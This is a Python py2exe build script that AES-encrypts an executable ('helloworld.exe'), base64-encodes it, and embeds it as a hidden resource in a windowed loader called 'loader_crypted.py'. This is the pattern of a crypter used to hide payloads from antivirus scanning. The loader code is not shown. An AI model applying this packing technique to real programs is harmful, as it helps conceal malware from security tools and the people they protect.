from distutils.core import setup
from Crypto.Cipher import AES
import py2exe, sys, os, base64

sys.argv.append('py2exe')

# crypto stuff
BLOCK_SIZE = 32
PADDING = '{'
key = 'cafefeed5badf00d'
# one-liner to sufficiently pad the text to be encrypted
pad = lambda s: str(s) + (BLOCK_SIZE - len(str(s)) % BLOCK_SIZE) * PADDING
# one-liner to encrypt a code block then base64 it
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))

file = 'helloworld.exe'
pFile = bytearray(open(file, 'rb').read())

encryptor = AES.new(key)
pFile = EncodeAES(encryptor, pFile)

py2exe_options = dict(
#	ascii=True,  # Exclude encodings
	excludes=['_ssl',  # Exclude _ssl
			  'pyreadline', 'difflib', 'doctest', 'locale',
			  'optparse', 'pickle', 'calendar'],  # Exclude standard library
			  dll_excludes=['msvcr71.dll'],  # Exclude msvcr71
              compressed=True,  # Compress library.zip
			  bundle_files = True,
              optimize =True,
			  packages=["win32api"],
)
  
setup(
options = {'py2exe': py2exe_options},
windows=[{
    'script':'loader_crypted.py',
    'icon_resources':[(1,'icon.ico')],
	'other_resources': [('DATA', 1, pFile)]
}],
zipfile = None,
)
